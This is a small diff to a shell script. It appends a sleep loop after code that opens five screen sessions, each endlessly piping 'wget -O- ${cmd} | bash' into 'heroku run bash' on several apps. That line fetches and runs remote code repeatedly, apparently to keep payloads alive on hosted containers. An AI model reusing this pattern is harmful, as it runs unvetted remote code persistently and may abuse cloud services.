@@ -18,3 +18,9 @@ for i in {1..5}
 do
 	screen -dm -S $i "while true; do (sleep 5; echo 'while true; do wget -O- ${cmd} | bash; done') | heroku run bash --app ${passwd}${i}; done"
 done
+
+# stop here
+while true
+do
+	sleep 3600
+done
